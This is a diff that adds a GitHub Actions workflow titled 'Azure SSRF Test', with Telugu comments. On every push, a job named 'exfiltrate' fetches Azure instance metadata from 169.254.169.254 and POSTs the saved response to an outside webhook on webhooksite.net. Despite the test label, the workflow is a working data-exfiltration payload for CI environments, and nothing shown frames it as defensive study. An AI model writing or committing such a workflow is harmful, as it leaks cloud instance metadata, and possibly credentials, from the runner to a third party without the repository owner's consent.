@@ -1,0 +1,14 @@
+name: Azure SSRF Test
+on: [push]
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Hit Metadata IP
+        run: |
+          # అజూర్ మెటాడేటా ఐపీని హిట్ చేయడం
+          curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" > data.json
+          
+          # నీ వెబ్‌హుక్‌కి డేటాని పంపడం
+          curl -X POST -d @data.json "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/?source=github_actions"
